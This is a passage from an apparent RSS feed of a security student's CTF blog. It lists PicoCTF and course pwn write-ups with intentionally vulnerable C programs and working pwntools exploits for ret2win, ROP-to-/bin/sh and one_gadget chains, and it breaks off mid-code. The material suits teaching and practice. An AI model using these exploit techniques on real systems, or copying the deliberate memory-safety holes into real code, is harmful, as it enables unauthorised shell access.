+0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---tic-tac/index.html</guid><description>PicoCTF - tic-tac Background 後端工程師面試考什麼 - Race Condition 篇 [Day24]攻擊篇 TOCTTOU
Time of check to time of use 在檢查和使用之間影響資源狀態的攻擊
這種攻擊可能發生在共享資源中。 可能導致程式在資源處於意外狀態時執行無效操作。
Source code :::spoiler Source code
#include &lt;iostream> #include &lt;fstream> #include &lt;unistd.h> #include &lt;sys/stat.h> int main(int argc, char *argv[]) { if (argc != 2) { std::cerr &lt;&lt; "Usage: " &lt;&lt; argv[0] &lt;&lt; " &lt;filename>" &lt;&lt; std::endl; return 1; } std::string filename = argv[1]; std::ifstream file(filename); struct stat statbuf; // Check the file's status information. if (stat(filename.c_str(), &amp;statbuf) == -1) { std::cerr &lt;&lt; "Error: Could not retrieve file information" &lt;&lt; std::endl; return 1; } // Check the file's owner. if (statbuf.st_uid != getuid()) { std::cerr &lt;&lt; "Error: you don't own this file" &lt;&lt; std::endl; return 1; } // Read the contents of the file. if (file.is_open()) { std::string line; while (getline(file, line)) { std::cout &lt;&lt; line &lt;&lt; std::endl; } } else { std::cerr &lt;&lt; "Error: Could not open file" &lt;&lt; std::endl; return 1; } return 0; } :::</description></item><item><title>PicoCTF - two-sum</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---two-sum/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---two-sum/index.html</guid><description>PicoCTF - two-sum Background BoF
Source code :::spoiler
#include &lt;stdio.h> #include &lt;stdlib.h> static int addIntOvf(int result, int a, int b) { result = a + b; if(a > 0 &amp;&amp; b > 0 &amp;&amp; result &lt; 0) return -1; if(a &lt; 0 &amp;&amp; b &lt; 0 &amp;&amp; result > 0) return -1; return 0; } int main() { int num1, num2, sum; FILE *flag; char c; printf("n1 > n1 + n2 OR n2 > n1 + n2 \n"); fflush(stdout); printf("What two positive numbers can make this possible: \n"); fflush(stdout); if (scanf("%d", &amp;num1) &amp;&amp; scanf("%d", &amp;num2)) { printf("You entered %d and %d\n", num1, num2); fflush(stdout); sum = num1 + num2; if (addIntOvf(sum, num1, num2) == 0) { printf("No overflow\n"); fflush(stdout); exit(0); } else if (addIntOvf(sum, num1, num2) == -1) { printf("You have an integer overflow\n"); fflush(stdout); } if (num1 > 0 || num2 > 0) { flag = fopen("flag.txt","r"); if(flag == NULL){ printf("flag not found: please run this on the server\n"); fflush(stdout); exit(0); } char buf[60]; fgets(buf, 59, flag); printf("YOUR FLAG IS: %s\n", buf); fflush(stdout); exit(0); } } return 0; } :::</description></item><item><title>PicoCTF - Unsubscriptions Are Free</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/index.html</guid><description>PicoCTF - Unsubscriptions Are Free Background Heap Exploitation / Used After Free
Source code :::spoiler Source Code
#include &lt;stdint.h> #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;fcntl.h> #include &lt;ctype.h> #define FLAG_BUFFER 200 #define LINE_BUFFER_SIZE 20 typedef struct { uintptr_t (*whatToDo)(); char *username; } cmd; char choice; cmd *user; void hahaexploitgobrrr(){ char buf[FLAG_BUFFER]; FILE *f = fopen("flag.txt","r"); fgets(buf,FLAG_BUFFER,f); fprintf(stdout,"%s\n",buf); fflush(stdout); } char * getsline(void) { getchar(); char * line = malloc(100), * linep = line; size_t lenmax = 100, len = lenmax; int c; if(line == NULL) return NULL; for(;;) { c = fgetc(stdin); if(c == EOF) break; if(--len == 0) { len = lenmax; char * linen = realloc(linep, lenmax *= 2); if(linen == NULL) { free(linep); return NULL; } line = linen + (line - linep); linep = linen; } if((*line++ = c) == '\n') break; } *line = '\0'; return linep; } void doProcess(cmd* obj) { (*obj->whatToDo)(); } void s(){ printf("OOP! Memory leak...%p\n",hahaexploitgobrrr); puts("Thanks for subsribing! I really recommend becoming a premium member!"); } void p(){ puts("Membership pending... (There's also a super-subscription you can also get for twice the price!)"); } void m(){ puts("Account created."); } void leaveMessage(){ puts("I only read premium member messages but you can "); puts("try anyways:"); char* msg = (char*)malloc(8); read(0, msg, 8); } void i(){ char response; puts("You're leaving already(Y/N)?"); scanf(" %c", &amp;response); if(toupper(response)=='Y'){ puts("Bye!"); free(user); }else{ puts("Ok. Get premium membership please!"); } } void printMenu(){ puts("Welcome to my stream! ^W^"); puts("=========================="); puts("(S)ubscribe to my channel"); puts("(I)nquire about account deletion"); puts("(M)ake an Twixer account"); puts("(P)ay for premium membership"); puts("(l)eave a message(with or without logging in)"); puts("(e)xit"); } void processInput(){ scanf(" %c", &amp;choice); choice = toupper(choice); switch(choice){ case 'S': if(user){ user->whatToDo = (void*)s; }else{ puts("Not logged in!"); } break; case 'P': user->whatToDo = (void*)p; break; case 'I': user->whatToDo = (void*)i; break; case 'M': user->whatToDo = (void*)m; puts("==========================="); puts("Registration: Welcome to Twixer!"); puts("Enter your username: "); user->username = getsline(); break; case 'L': leaveMessage(); break; case 'E': exit(0); default: puts("Invalid option!"); exit(1); break; } } int main(){ setbuf(stdout, NULL); user = (cmd *)malloc(sizeof(user)); while(1){ printMenu(); processInput(); //if(user){ doProcess(user); //} } return 0; } :::</description></item><item><title>PicoCTF - VNE</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---vne/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---vne/index.html</guid><description>PicoCTF - VNE Background System Environment Command Injection
Description &amp; Hint We’ve got a binary that can list directories as root, try it out !! ssh to saturn.picoctf.net:53176, and run the binary named “bin” once connected. Login as ctf-player with the password, d137d16e
Hint 1: Have you checked the content of the /root folder Hint 2: Find a way to add more instructions to the ls Source Code :::spoiler IDA Main Function</description></item><item><title>PicoCTF - x-sixty-what</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---x-sixty-what/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---x-sixty-what/index.html</guid><description>PicoCTF - x-sixty-what Source code :::spoiler
:::
Recon 這一題有點奇怪，沒有想像中簡單，看起來就是一個簡單的return 2 function的問題，但是看了objdump的flag function原本應該是0x401236，但是會友segmentation fault，看了其他的WP1，發現應該return到0x40123b，不太知道為甚麼
第一張是return 2 0x401236 第二張是return 2 0x40123b Exploit 用動態的方式看offset $$ 0x7fffffffd758 - 0x00007fffffffd710 = 0x48 $$ from pwn import * r = remote('saturn.picoctf.net', 58166) # r = process('./vuln') context.arch = 'amd64' raw_input() print(r.recvline().strip().decode()) payload = b'a'*0x48 + p64(0x40123b) print(payload) r.sendline(payload) r.interactive() Flag: picoCTF{b1663r_15_b3773r_e79d5a75}</description></item><item><title>PWN Overview</title><link>https://bernie6401.github.io/tools/ctf/pwn-overview/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/pwn-overview/index.html</guid><description>PWN Overview :::spoiler TOC [TOC] :::
Tools Cheat Commonly Used Commands $ file {file path} $ checksec {file path} # sudo apt-get install checksec $ objdump -M intel -d {file path} | less $ gdb {file path} # sudo apt-get install gdb $ readelf -a {file path} | less # 查看所有資訊，包含section/file-header/program headers/symbol tables/等等 $ readelf -S {file path} # 只查看sections' header $ ldd {file path} # to check what libraries the file used Command Used Tools / Plugin gdb-peda $ git clone https://github.com/longld/peda.git ~/peda $ echo "source ~/peda/peda.py" >> ~/.gdbinit radare2 $ git clone https://github.com/radare/radare2.git $ sudo apt install build-essential # just for wsl $ sudo ./radare2/sys/install.sh Exploit DB - Shell Code：如果要寫shell code的話可以直接看exploit db上別人寫好的gadget，複製起來就可以用了，不過有時候也有可能會失敗，在確認其他東西都是正確的情況下，可以試看看別的，記得平台要選對 ROPgadget $ sudo apt install python3-pip $ sudo -H python3 -m pip install ROPgadget $ ROPgadget --help # For using $ ROPgadget --binary {executed file} | grep 'pop rax.*ret' # Or $ ROPgadget --binary {executed file} --only "pop|ret|syscall" > rop_gadget.txt $ ROPgadget --binary {executed file} --only "pop|ret|syscall" --multibr > rop_gadget.txt # multibr是multi bransh允許多分支的gadget # 取得特定string的gadget $ ROPgadget --binary {executed file} --string "/bin/sh" one_gadget $ sudo apt install rubygems $ sudo gem install one_gadget $ one_gadget {libc file} seccomp-tools $ sudo apt install gcc ruby-dev $ gem install seccomp-tools $ seccomp-tools dump ./test 找glibc版本的online tool libc-database search API Search libc database search gdb :::spoiler 常用語法(cheat)</description></item><item><title>Simple Buffer Overflow - 0x00</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x00/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x00/index.html</guid><description>Simple Buffer Overflow - 0x00 tags: CTF PWN Original Code #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> int main() { char buf[0x10]; read(0, buf, 0x30); // It'll read the value that you input and store in buf with length=0x30 system("pause"); return 0; } Note that you can check this page to know more about read function Dynamic Analysis - x32dbg This is the original entry point of this program.</description></item><item><title>Simple Buffer Overflow - 0x01</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/index.html</guid><description>Simple Buffer Overflow - 0x01 tags: CTF PWN Follow the concept of lecture 0x00
Original Code #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> void y0u_c4n7_533_m3() { execve("/bin/sh", (char *[]){0}, (char *[]){0}); } int main() { char buf[16]; puts("This is your first bof challenge ;)"); fflush(stdout); read(0, buf, 0x30); system("pause"); return 0; } The secret function is aim to create a shell, therefore, our main purpose is try to get the shell by using buffer overflow. We can check bof in the main function that it read the string with length 0x30 that bigger than buf size.</description></item><item><title>Simple Buffer Overflow - 0x02</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x02/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x02/index.html</guid><description>Simple Buffer Overflow - 0x02 tags: CTF PWN Why we’d like to create shellcode? In pwn problem, most of the program don’t have the secret function that we can take the shell. Thus, we can create a shellcode by ourselves and use bof to overlap the original address by shellcode address. Then we can take the shell.
How to create a shellcode in BOF? In lecture 0x01, we can see sub-function that create a shell using command:</description></item><item><title>Simple Buffer Overflow - 0x04</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/index.html</guid><description>Simple Buffer Overflow - 0x04 tags: CTF PWN Original Code #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> char message[48]; int main() { char name[16]; printf("Give me your message: "); fflush(stdout); read(0, message, 0x30); fflush(stdout); read(0, name, 0x30); return 0; } Actually, this is a variant of the lecture 0x01
Note that, the global variable has its own address, instead of local variable that push to stack that we don’t know at first.</description></item><item><title>Simple Buffer Overflow - 0x05(Leak Canary)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/index.html</guid><description>Simple Buffer Overflow - 0x05(Leak Canary) tags: CTF PWN eductf Canary Background Original Code #include &lt;stdio.h> #include &lt;unistd.h> #include &lt;stdlib.h> void backdoor() { system("/bin/sh"); } int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); char name[0x10]; char phone[0x10]; printf("What's your name: "); read(0, name, 0x100); printf("Hello, %s !", name); printf("What's your phone number: "); read(0, phone, 0x100); return 0; } Note that, if you establish the code yourself, you must turn off the protection by the command below and use checksec to observe the protection gcc -o bof2_leak_canary bof2_leak_canary.c -zexecstack -no-pie -z norelro Exploit First, we can use objdump -d -M Intel {filename} to check the address of backdoor → 0x4011b6</description></item><item><title>Simple PWN - 0x06(GOT hijacking/Lab - `got2win`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x06got-hijacking_lab---got2win/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x06got-hijacking_lab---got2win/index.html</guid><description>Simple PWN - 0x06(GOT hijacking/Lab - got2win) tags: CTF PWN eductf challenge: nc edu-ctf.zoolab.org 10004
GOT Background Lecture Vid. - Pwn week1 NTUSTISC - Pwn Basic 2 [2019.03.19]
Original Code :::spoiler Original Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> #include &lt;fcntl.h> char flag[0x30]; int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); int fd = open("/home/chal/flag", O_RDONLY); read(fd, flag, 0x30); close(fd); write(1, "Good luck !\n", 13); unsigned long addr = 0; printf("Overwrite addr: "); scanf("%lu", &amp;addr); printf("Overwrite 8 bytes value: "); read(0, (void *) addr, 0x8); printf("Give me fake flag: "); int nr = read(1, flag, 0x30); if (nr &lt;= 0) exit(1); flag[nr - 1] = '\0'; printf("This is your flag: ctf{%s}... Just kidding :)\n", flag); return 0; } :::</description></item><item><title>Simple PWN - 0x07(ROP)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x07rop/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x07rop/index.html</guid><description>Simple PWN - 0x07(ROP) tags: CTF PWN eductf Background This is very similar to normal BOF. If a sample code that doesn’t have a backdoor function and you cannot input a backdoor function as well, then you can use some code segment to merge a shellcode. Therefore, the main idea is use some &lt;operation>;ret pattern segment to overlap stack. Original Code #include &lt;stdio.h> #include &lt;unistd.h> int main() { setvbuf(stdin, 0, _IONBF, 0) setvbuf(stdout, 0, _IONBF, 0); char s[0x10]; printf("Here is your \"/bin/sh\": %p\n", "/bin/sh"); printf("Give me your ROP: "); read(0, s, 0x400); return 0; } At line 11, %p means pointer of /bin/sh string. Note that, if you establish the code yourself, you must turn off the protection by the command below and use checksec to observe the protection. In addition, please use -static command to compile library at compile time, so that we can get ROP gadget more easily. gcc -o rop rop.c -zexecstack -no-pie -fno-stack-protector -z norelro -static Exploit First, we can observe the program has overflow(very important), but has no other backdoor method can access or global variable can write shellcode. Then we can consider to use ROP gadget to construct chain. Second, we use ROPgadget to find suitable gadget $ ROPgadget --multibr --binary rop > rop_gadget $ vim rop_gadget Note that, you may consider that pop rdx ; pop rbx ; ret is not what we want. We just want pop rdx ; ret. Therefore, we have to push one more value for pop rbx ; instruction. Then, we can construct our payload: from pwn import * context.arch = 'amd64' r = process('./rop') r.recvuntil('Here is your "/bin/sh": ') binsh = int(r.recvline()[:-1], 16) info(f"binsh: {hex(binsh)}") pop_rdi_ret = 0x401eaf pop_rsi_ret = 0x409ede pop_rdx_ret = 0x485aeb pop_rax_ret = 0x44fcc7 syscall = 0x401c64 Note that, r.recvline()[:-1] is b'0x498004' and we must pop to %rdi at line 17 below. Then we can combine them together using flat method. It’ll flat the address with length 8 bytes. ROP = flat( pop_rdi_ret, binsh, pop_rsi_ret, 0, pop_rdx_ret, 0, 0, pop_rax_ret, 0x3b, syscall, ) gdb.attach(r) r.sendafter("Give me your ROP: ", b'a' * 0x18 + ROP) r.interactive() Finally, we got shell!!! Analysis This is totally the same as our hypothesis. We can see that all parameters are ready Reference NTUSTISC - Pwn Basic 3 [2019.03.26] Pwn week1</description></item><item><title>Simple PWN - 0x08(one_gadget with ROP)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/index.html</guid><description>Simple PWN - 0x08(one_gadget with ROP) tags: CTF PWN eductf one_gadget background Day25: [Misc] 我從來沒想過我會害怕寫 code
原理是在 glibc 裡面有很多會透過 execve 執行 /bin/sh、再調用外部系統指令的 assembly，當 explolit 已經得知 libc 的位之後而且可以控制 RIP 之後，就可以直接跳該位置達成 shell out，不需要再辛苦堆 stack 上的參數
Original Code #include &lt;stdio.h> #include &lt;unistd.h> int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IOBNF, 0); char s[0x10]; printf("Your libc: %p", printf); read(0, s, 0x100); return 0; } The program has buffer overflow, however it has no backdoor method can access and has no global variable can write shellcode. Thus, we can consider to use ROP to get shell. Note that, it must be a dynamic library, so DO NOT use -static to compile it. gcc -o one_gadget_with_rop one_gadget_with_rop.c -no-pie -fno-stack-protector -z norelro -zexecstack Exploit First, we use ldd command to find what library the program will use. In addition, we use one_gadget command to find execvs Note that, how to use it can refer to one_gadget用法 We use 0xebcf8 execve("/bin/sh", rsi, rdx) as our method Note: it has 3 constraint so that we can get the shell address rbp-0x78 is writable [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL Then, we use one_gadget command to get ROP chain ROPgadget --binary one_gadget_with_rop --only "pop|ret" > one_gadget vim one_gadget You can see that because we didn’t compile with library, the gadget that we may can use is very few. The solution is using the gadget that libc have: $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" > one_gadget $ vim one_gadget We must satisfied one_gadget constraint. 0x90529 and 0x2be51 are the offset of /lib/x86_64-linux-gnu/libc.so.6. Therefore, if we want to call these gadget, we must find out the real base address of /lib/x86_64-linux-gnu/libc.so.6. Because, ASLR is turn on in default, so the address of library will be random, we just know the offset of library. In original code, it told us the printf address in /lib/x86_64-linux-gnu/libc.so.6 → 0x7ffff7def770 Used gdb can find the current address of library → 0x7ffff7d8f000 Then we can know the offset and construct apart of payload as below $$0x7ffff7def770 - 0x7ffff7d8f000 = 0x60770$$ from pwn import * import sys context.arch = 'amd64' r = process('./one_gadget_with_rop') r.recvuntil("Your libc: ") libc = int(r.recv(14), 16) - 0x60770 info(f"libc: {hex(libc)}") And prepare our gadget: pop_rdx_rbx_ret = libc + 0x90529 pop_rsi_ret = libc + 0x2be51 Construct whole payload with considering the constraint: r.send(b'a'*0x10 + p64(0x404000) + p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) + p64(libc+0xebcf8)) r.interactivae() b'a'*0x10 is for $rsi p64(0x404000) is an arbitrary writable and readable address for $rbp-0x78 one of the constraint of one_gadget p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) is what we did in last lecture of ROP p64(libc+0xebcf8) is the one_gadget that we choose at the beginning. Finally, we got shell!!! Reference Linux ldd 查看執行檔執行時需要哪些 library Pwn week1</description></item><item><title>Simple PWN - 0x09(stack pivoting)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/index.html</guid><description>Simple PWN - 0x09(stack pivoting) tags: CTF PWN eductf Stack Pivoting background NTUSTISC - Pwn Basic 3 [2019.03.26] Pwn week1 It was used when stack overflow bytes not big enough to access a shellcode but it has another lots of writable space can be accessed. More detailed info. can refer to Binary Exploitation (Pwn)
Original Code #include &lt;stdio.h> #include &lt;unistd.h> char name[0x80] int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); char s[0x10]; printf("Give me your name: "); read(0, name, 0x80); printf("Give me your ROP: "); read(0, s, 0x20); return 0; } You can observe that it has not much stack buffer overflow can use, but it has global variable name with space 0x80(can be another stack) gcc -o stack_pivoting stack_pivoting.c -no-pie -fno-stack-protector -z norelro -zexecstack -static Note that: must use mprotect to change permission of global variable name just like lecture 0x04, add these line in original code #include &lt;sys/mman.h> mprotect(0x403000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC); Before mprotect - vmmap After mprotect - vmmap Exploit Construct ROP chain</description></item><item><title>Simple PWN - 0x10(`seccomp`/Lab - `rop2win`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/index.html</guid><description>Simple PWN - 0x10(seccomp/Lab - rop2win) tags: CTF PWN eductf challenge: nc edu-ctf.zoolab.org 10005
seccomp background Pwn week1
Original Code :::spoiler
#include &lt;stdio.h> #include &lt;unistd.h> #include &lt;seccomp.h> char fn[0x20]; char ROP[0x100]; // fd = open("flag", 0); // read(fd, buf, 0x30); // write(1, buf, 0x30); // 1 --> stdout int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_load(ctx); seccomp_release(ctx); printf("Give me filename: "); read(0, fn, 0x20); printf("Give me ROP: "); read(0, ROP, 0x100); char overflow[0x10]; printf("Give me overflow: "); read(0, overflow, 0x30); return 0; } :::</description></item><item><title>Simple PWN - 0x11(format string bug)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/index.html</guid><description>Simple PWN - 0x11(format string bug) tags: CTF PWN eductf format string bug background printf %n Original Code #include &lt;stdio.h> #include &lt;unistd.h> #include &lt;stdlib.h> int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); char fmt[0x20]; system("echo 'Give me fmt: '"); read(0, fmt, 0x20); printf(fmt); system("echo 'Give me string: '"); read(0, fmt, 0x20); puts(fmt); return 0; } $ gcc -o fmt fmt.c -no-pie -fno-stack-protector -z norelro -zexecstack In this problem, we can consider to use format string bug to achieve GOT hijacking without buffer overflow. The main idea is totally the same as GOT hijacking lecture Thus, we can observe which function can be overlapped by system plt → puts function Because… puts just needs one argument like system function, but how about printf? Unfortunately, it appeared before 2nd read function, because 2nd read needs to store the argument for system function such as sh\x00. Exploit - GOT hijacking + format string bug Our goal is hijack puts GOT to system plt</description></item><item><title>Simple PWN - 0x12(Lab - `rop++`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/index.html</guid><description>Simple PWN - 0x12(Lab - rop++) tags: CTF PWN eductf challenge: nc edu-ctf.zoolab.org 10004
Original Code #include &lt;stdio.h> #include &lt;unistd.h> #include &lt;string.h> int main() { char buf[0x10]; const char *msg = "show me rop\n> "; write(1, msg, strlen(msg)); read(0, buf, 0x200); return 0; } gcc -fno-stack-protector -static -o chal rop++.c Analyze Obviously buffer overflow!!!
Check protector
$ checksec chal [*] '/home/sbk6401/NTUCS/PWN/Lab/rop++/share/chal' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Preliminary idea is using ROP chain and get shell, but the problem is where can I write /bin/sh\x00? We can use vmmap to observe where section is writable and readable → 0x4c5000~0x4c800</description></item><item><title>Simple PWN - 0x13(Lab - `how2know`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/index.html</guid><description>Simple PWN - 0x13(Lab - how2know) tags: CTF PWN eductf challenge: nc edu-ctf.zoolab.org 10002 Environment Version: 22.04
Original Code :::spoiler code
#include &lt;stdio.h> #include &lt;unistd.h> #include &lt;fcntl.h> #include &lt;seccomp.h> #include &lt;sys/mman.h> #include &lt;stdlib.h> static char flag[0x30]; int main() { void *addr; int fd; scmp_filter_ctx ctx; addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); if ((unsigned long)addr == -1) perror("mmap"), exit(1); fd = open("/home/chal/flag", O_RDONLY); if (fd == -1) perror("open"), exit(1); read(fd, flag, 0x30); close(fd); write(1, "talk is cheap, show me the code\n", 33); read(0, addr, 0x1000); ctx = seccomp_init(SCMP_ACT_KILL); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); seccomp_load(ctx); seccomp_release(ctx); ((void(*)())addr)(); return 0; } :::</description></item><item><title>Simple PWN - 0x14(Simple HEAP)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x14simple-heap/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x14simple-heap/index.html</guid><description>Simple PWN - 0x14(Simple HEAP) tags: CTF PWN eductf Version: Ubuntu 20.04
HEAP background Advanced Binary Exploitation (Pwn) - Heap Exploitation SS111-Pwn2
Allocate a memory Original Code #include &lt;stdio.h> #include &lt;stdlib.h> int main() { void *ptr; ptr = malloc(0x30); return 0; } $ sudo gcc -o simple_heap simple_heap.c -no-pie Analyze Before executing malloc, there is no heap space in memory layout</description></item><item><title>Simple PWN - 0x15(Lab - `heapmath`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x15lab---heapmath/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x15lab---heapmath/index.html</guid><description>Simple PWN - 0x15(Lab - heapmath) tags: CTF PWN eductf Version: Ubuntu 20.04
Original Code :::spoiler code
#include &lt;stdio.h> #include &lt;string.h> #include &lt;stdlib.h> #include &lt;unistd.h> #include &lt;fcntl.h> #include &lt;time.h> int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); srand(time(NULL)); void *tcache_chk[7] = {0}; unsigned char tcachebin[3][7] = {0}; // 0x20, 0x30, 0x40 unsigned int tcachebin_counts[4] = {0}; unsigned long tcache_size[7] = {0}; unsigned long tcache_free_order[7] = {0}; puts("----------- ** tcache chall ** -----------"); unsigned long tmp = 0; for (int i = 0; i &lt; 7; i++) { tmp = (rand() % 0x21) + 0x10; // 0x10 ~ 0x30 tcache_size[i] = tmp; } for (int i = 0; i &lt; 7; i++) { repeat: tmp = rand() % 7; for (int j = 0; j &lt; i; j++) if (tmp == tcache_free_order[j]) goto repeat; tcache_free_order[i] = tmp; } for (int i = 0; i &lt; 7; i++) { tcache_chk[i] = malloc( tcache_size[i] ); printf("char *%c = (char *) malloc(0x%lx);\n", 'A' + i, tcache_size[i]); } for (int i = 0; i &lt; 7; i++) { int idx = tcache_free_order[i]; free(tcache_chk[ idx ]); printf("free(%c);\n", 'A' + (unsigned char) idx); tmp = tcache_size[ idx ] - 0x8; if (tmp % 0x10) tmp = (tmp &amp; ~0xf) + 0x20; else tmp += 0x10; unsigned int binidx = ((tmp - 0x20) / 0x10); unsigned int bincnt = tcachebin_counts[ binidx ]; tcachebin[ binidx ][ bincnt ] = 'A' + (unsigned char) idx; tcachebin_counts[ binidx ]++; } char tmpbuf[0x100] = {0}; char ansbuf[3][0x100] = {0}; for (int i = 0; i &lt; 3; i++) { for (int j = 6; j >= 0; j--) if (tcachebin[i][j]) { sprintf(tmpbuf, "%c --> ", tcachebin[i][j]); strcat(ansbuf[i], tmpbuf); } strcat(ansbuf[i], "NULL"); } puts(""); for (int i = 0; i &lt; 3; i++) { printf("[chunk size] 0x%x: ", (i+2) * 0x10); if (i == 0) { printf("%s\t(just send \"%s\")\n", ansbuf[i], ansbuf[i]); } else { printf("?\n> "); fgets(tmpbuf, 0x100, stdin); if (!strncmp(tmpbuf, ansbuf[i], strlen(ansbuf[i]))) { puts("Correct !"); } else { puts("Wrong !"); printf("Ans: \"%s\"\n", ansbuf[i]); exit(0); } } } puts("\n----------- ** address chall ** -----------"); int cmp1 = 0; int cmp2 = 